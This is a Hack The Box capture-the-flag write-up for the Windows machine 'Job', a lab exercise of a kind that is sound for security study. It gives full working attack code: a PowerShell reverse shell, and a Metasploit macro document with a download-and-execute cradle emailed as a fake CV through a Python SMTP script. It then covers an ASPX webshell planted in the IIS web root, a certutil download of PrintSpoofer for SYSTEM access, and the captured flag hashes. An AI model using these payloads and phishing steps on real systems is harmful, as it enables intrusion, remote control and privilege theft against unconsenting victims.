Author: Faridd

### HTB Write-Up: Job

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Job)         |
| Difficulty | Medium                                                            |
| OS         | Windows                                                           |
| Date       | November 06, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & Nmap](#1-reconnaissance--rustscan--nmap)
2. [Enumeration — SMB Lockdown & Website/SMTP Discovery](#2-enumeration--smb-lockdown--websitesmtp-discovery)
3. [Initial Access — LibreOffice Macro RCE via Emailed CV](#3-initial-access--libreoffice-macro-rce-via-emailed-cv)
4. [Privilege Escalation (Part 1) — Writable wwwroot to IIS AppPool via ASPX Webshell](#4-privilege-escalation-part-1--writable-wwwroot-to-iis-apppool-via-aspx-webshell)
5. [Privilege Escalation (Part 2) — SeImpersonatePrivilege Abuse via PrintSpoofer](#5-privilege-escalation-part-2--seimpersonateprivilege-abuse-via-printspoofer)

---

#### 1. Reconnaissance — Rustscan & Nmap

```bash
rustscan -a 10.129.234.73 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.234.73:25
Open 10.129.234.73:80
Open 10.129.234.73:445
Open 10.129.234.73:5985
```

```bash
nmap -A -p25,80,445,5985 10.129.234.73
```

**Result:**

```
25/tcp   open  smtp          hMailServer smtpd
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Job.local
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The target is a Windows Server 2022 host (hostname **JOB**, domain **job**) running IIS, SMB, WinRM, and — notably — an **SMTP server (hMailServer)**, which is unusual and hints that mail delivery will play a role in the attack path.

---

#### 2. Enumeration — SMB Lockdown & Website/SMTP Discovery

##### 2.1 — SMB Access Attempts

```bash
netexec smb 10.129.234.73 -u "" -p "" --shares
netexec smb 10.129.234.73 -u "guest" -p "" --shares
```

**Result:**

```
[-] job\: STATUS_INVALID_PARAMETER
[-] job\guest: STATUS_ACCOUNT_DISABLED
```

Both anonymous and guest SMB access were blocked, ruling out SMB as an entry point.

##### 2.2 — Website Review

Browsing the site revealed a recruitment message:

> We are looking for developers! Please send your application to career@job.local! We recently switched to using open source products - please send your cv as a libre office document.

This is the key clue: the site explicitly requests `.odt` (LibreOffice) CV submissions to an email address, and SMTP (port 25) is open directly on the box — meaning a submitted document would be opened by a mail-processing/automation user on the host itself. The domain was added to `/etc/hosts`:

```bash
echo "10.129.234.73 job.local" | sudo tee -a /etc/hosts
```

Subdomain and directory enumeration against the site returned nothing further, confirming the LibreOffice document submission was the intended path in.

---

#### 3. Initial Access — LibreOffice Macro RCE via Emailed CV

LibreOffice documents support embedded macros, and certain LibreOffice versions are vulnerable to **arbitrary code execution through a malicious macro** that auto-executes when the document is opened — this is the vector Metasploit's `openoffice_document_macro` module targets.

##### 3.1 — Staging the Payload Servers

A web server was started to host the PowerShell stager, and a listener was opened for the resulting reverse shell:

```bash
python3 -m http.server 80
sudo nc -nvlp 443
```

##### 3.2 — Building the PowerShell Reverse Shell Stager

A `shell.ps1` TCP reverse shell script was written, pointing back to the attacker's IP on port 443:

```powershell
$lhost="10.10.14.25";
$lport=443;
$MAXCMDLENGTH=65535;
$client = New-Object System.Net.Sockets.TCPClient($lhost, $lport);
$stream = $client.GetStream();
$bytes = (New-Object byte[] $MAXCMDLENGTH);
$out = ([text.encoding]::ASCII).GetBytes("PS $($pwd.Path)> ");
$stream.Write($out, 0, $out.Length);
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $in = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    try {
        $out = (iex $in 2>&1 | Out-String);
    }
    catch {
        $out = ($_ | Out-String);
    }
    $out = "$($out)PS $($pwd.Path)> ";
    $out = ([Text.Encoding]::ASCII).GetBytes($out);
    $stream.Write($out, 0, $out.Length);
    $stream.Flush();
}
$client.Close();
```

##### 3.3 — Weaponizing the Document with Metasploit

```
use exploit/multi/misc/openoffice_document_macro
set payload windows/x64/exec
set SRVHOST 0.0.0.0
set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.25/shell.ps1')"
run
```

This generated a malicious `.odt` file whose embedded macro, on open, downloads and executes `shell.ps1` — a classic stager pattern that keeps the payload itself small and avoids embedding the full shell in the document.

##### 3.4 — Delivering the Payload via SMTP

A Python script was used to email the malicious `.odt` as a CV attachment directly to the address advertised on the website:

```python
import smtplib
from email.message import EmailMessage
import base64

msg = EmailMessage()
msg['Subject'] = 'Job Application'
msg['From'] = 'attacker@mail.com'
msg['To'] = 'career@job.local'
msg.set_content('Please find my CV attached.')

with open('/root/.msf4/local/msf.odt', 'rb') as f:
    data = f.read()
    msg.add_attachment(data,
                       maintype='application',
                       subtype='vnd.oasis.opendocument.text',
                       filename='CV.odt')

with smtplib.SMTP('10.129.234.73', 25) as server:
    server.send_message(msg)
```

```bash
sudo python3 shell.py
```

##### 3.5 — Catching the Shell

After waiting roughly two minutes for the document to be opened on the target (presumably by an automated HR/application review process), the stager was fetched and the reverse shell connected back:

```bash
python3 -m http.server 80
# GET /shell.ps1 HTTP/1.1" 200

sudo nc -nvlp 443
# connect to [10.10.14.25] from (UNKNOWN) [10.129.234.73] 55010
```

##### 3.6 — User Flag

```powershell
PS C:\users\jack.black\desktop> type user.txt
c34a9fdbf62eaf4f1b0f20473175de53
```

The shell landed as `job\jack.black`, a member of the custom **`developers`** group — a strong lead for the next privilege-escalation step.

---

#### 4. Privilege Escalation (Part 1) — Writable wwwroot to IIS AppPool via ASPX Webshell

##### 4.1 — Checking developers Group Permissions

Since `jack.black` belongs to `developers`, the IIS web root was checked for permissions granted to that group:

```powershell
icacls "C:\inetpub\wwwroot\*" /find developers
Get-ChildItem "C:\inetpub\wwwroot" -Directory | Get-Acl | Select-Object Path, AccessToString | Format-List
```

**Result (relevant extract):**

```
Path           : C:\inetpub\wwwroot\assets
AccessToString : JOB\developers Allow  FullControl
                 BUILTIN\IIS_IUSRS Allow  ReadAndExecute, Synchronize
                 ...
```

`JOB\developers` has **FullControl** over several subdirectories of `C:\inetpub\wwwroot` — the directory actively served by IIS. Write access here means `jack.black` can plant a file that IIS will execute, giving code execution as whatever account runs the IIS application pool.

##### 4.2 — Uploading an ASPX Webshell

A public ASPX reverse-shell webshell ([borjmz/aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell)) was hosted and pulled onto the target directly into the web root:

```bash
python3 -m http.server 1212
```

```powershell
wget http://10.10.14.25:1212/shell.aspx -Outfile \inetpub\wwwroot\shell.aspx
```

##### 4.3 — Triggering the Webshell

```bash
nc -nvlp 1234
```

Browsing to `http://job.local/shell.aspx` caused IIS to execute the uploaded page, returning a shell:

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.234.73] 55014
c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

##### 4.4 — Checking Privileges

```
c:\windows\system32\inetsrv>whoami /all
```

**Result (relevant extract):**

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

The `defaultapppool` service account holds **SeImpersonatePrivilege** — a well-known path to SYSTEM via token impersonation (e.g. PrintSpoofer, RoguePotato, GodPotato).

---

#### 5. Privilege Escalation (Part 2) — SeImpersonatePrivilege Abuse via PrintSpoofer

##### 5.1 — Transferring PrintSpoofer

```bash
python3 -m http.server 1213
```

```cmd
certutil -f -urlcache http://10.10.14.25:1213/PrintSpoofer64.exe PrintSpoofer64.exe
```

##### 5.2 — Exploiting SeImpersonatePrivilege

**PrintSpoofer** abuses the Print Spooler service's named-pipe impersonation to coerce a SYSTEM-level token into the current process, then spawns a process using that token:

```cmd
.\PrintSpoofer64.exe -i -c cmd.exe
```

**Result:**

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

C:\Windows\system32>whoami
nt authority\system
```

##### 5.3 — Root Flag

```cmd
C:\Users\Administrator\Desktop>type root.txt
2e46837fb7f613c4c02c3341eca0060c
```
